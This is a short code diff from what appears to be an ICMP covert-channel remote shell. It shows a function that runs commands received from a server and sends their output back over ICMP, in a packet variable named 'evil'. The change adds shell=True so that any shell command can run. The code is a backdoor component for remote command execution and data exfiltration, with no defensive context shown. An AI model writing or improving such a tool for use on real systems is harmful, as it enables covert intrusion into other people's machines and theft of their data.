@@ -8,7 +8,7 @@ def send_over_icmp(server, response):
     send(evil)
 
 def execute_command(server, command):
-    p = subprocess.Popen(command, stdout=PIPE, stderr=PIPE)
+    p = subprocess.Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
     output, error = p.communicate()
     send_over_icmp(server, output)
 
